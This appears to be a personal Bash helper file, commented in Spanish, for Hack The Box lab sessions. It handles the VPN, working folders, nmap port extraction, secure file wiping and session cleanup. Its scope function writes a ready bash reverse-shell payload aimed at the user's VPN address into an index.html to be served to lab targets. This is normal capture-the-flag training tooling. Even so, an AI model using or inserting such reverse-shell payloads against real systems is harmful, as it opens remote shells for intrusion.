#Colors

endcolor="\033[0m\e[0m"

green="\e[0;32m\033[1m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
negro="\e[0;30m\033[1m"
fondonegro="\e[0;40m\033[1m"
fondoverde="\e[0;42m\033[1m"
fondoamarillo="\e[0;43m\033[1m"
fondoazul="\e[0;44m\033[1m"
fondopurple="\e[0;46m\033[1m"
fondogris="\e[0;47m\033[1m"

function funciones(){
  echo -e "\n\t${red}[+]${endcolor} ${green}htbvpn${endcolor} Ejecuta la VPN descargada"
  echo -e "\n\t${red}[+]${endcolor} ${green}rmk${endcolor} Borra totalmente"
  echo -e "\n\t${red}[+]${endcolor} ${green}scope${endcolor} Crea un target y directorios de trabajo"
  echo -e "\n\t${red}[+]${endcolor} ${green}finish${endcolor} Mata la VPN, sesion TMUX y borra directorios de trabjo" 
  echo -e "\n\t${red}[+]${endcolor} ${green}ports${endcolor} Muestra los puertos descubiertos de un archivo -oG de NMAP\n" 
}
#funciones
function htbvpn(){
sudo /usr/sbin/openvpn /home/kermit/Descargas/firefox/*.ovpn
}

function rmk(){
  scrub -p dod $1
  shred -zun 10 -v $1
}
function helpPanel(){
echo -ne "\n\t${red}[!]${endcolor} Es necesario especificar ambos parametros"
echo -ne "\n\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip"
echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre"
tput cnorm;

}
function scope(){

tput civis
declare -i counter=0; while getopts "i:n:h:" arg; do
    case $arg in
      i) ip_address=$OPTARG; let counter+=1;;
      n) nombre_maquina=$OPTARG; let counter+=1;;
      h) helpPanel;;
    esac
done
  
if [ $counter -eq 0 ]; then
  helpPanel
else
  echo -ne "\n\n\t${yellow}[&]${endcolor} Confirmando conexion VPN..."
  IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
fi
if [ "$IFACE" = "tun0" ]; then
  htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
  echo -ne "\n\n\t${blue}[+]${endcolor} Conexion con VPN establecida"
  echo -ne "\n\n\t${blue}[+]${endcolor} Ip de Hack the box: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
  #ip_address=$1
  #nombre_maquina=$2
  echo "$ip_address" > /home/kermit/.config/bin/target.txt
  echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
  export ip=$(/usr/bin/cat ~/.config/bin/target.txt)
  export name=$(/usr/bin/cat ~/.config/bin/name.txt)

  echo "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo..."
  mkdir /home/kermit/maquinas/$nombre_maquina
  touch /home/kermit/maquinas/$nombre_maquina/scan
  touch /home/kermit/maquinas/$nombre_maquina/credentials
  touch /home/kermit/maquinas/$nombre_maquina/index.html
  chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
  cd /home/kermit/maquinas/$nombre_maquina
  echo "\n"
  lsd -la
  tput cnorm
else
  echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
  tput cnorm
fi
}
# funcion iiixgxgstrackckcttt porrrtttsss
function ports(){
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
    echo -e "\n${red}[*]${endcolor} ${green}Extracting information...${endcolor}\n" > extractPorts.tmp
    echo -e "\t${red}[*]${endcolor} ${green}IP Address:${endcolor} $ip_address"  >> extractPorts.tmp
    echo -e "\t${red}[*]${endcolor} ${green}Open ports:${endcolor} $ports\n"  >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
    /usr/bin/bat extractPorts.tmp; /usr/bin/rm extractPorts.tmp
}
#Funcion para cerrar sesion
function finish(){
 
tput civis
  
# Borrando /descargas/firefox
rm -rf /home/kermit/Descargas/firefox/*
echo -ne "\n\n\t${yellow}[$]${endcolor} Borrando descargas..."
if [ -z "$(ls -A /home/kermit/Descargas/firefox/)" ]; then
  echo "\n\n\t${blue}[+]${endcolor} Borrado correctamente"
else
  echo "\n\n\t${red}[!]${endcolor} Error al borrar /Descargas/firefox"
fi

#Matando sesion tmux
tmux kill-session -t $name &> /dev/null
echo -ne "\n\n\t${yellow}[$]${endcolor} Cerrando TMUX..."
tmux has-session -t $name
sesion=$(echo "$?")
if [ "$sesion" != 1 ]; then
  echo -ne "\n\n\t${blue}[+]${endcolor} Sesion TMUX ${blue}$name${endcolor} finalizada"
else 
  echo -ne "\n\n\t${red}[!]${endcolor} Error al matar la sesion TMUX $name"
  tput cnorm
fi
echo "" > /home/kermit/.config/bin/target.txt
echo "" > /home/kermit/.config/bin/name.txt
tput cnorm

# Matando la VPN
echo "\n" 
sudo /usr/bin/killall openvpn
echo -ne "\n\n\t${yellow}[$]${endcolor}Matando VPNs..."
IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
if [ "$IFACE" == "tun0" ]; then
  echo -ne "\n\n\t${blue}[!]${endcolor} Error al matar las VPNs"
else
  echo -ne "\n\n\t${red}[+]${endcolor} VPNs finalizadas"
fi

tput cnorm
}

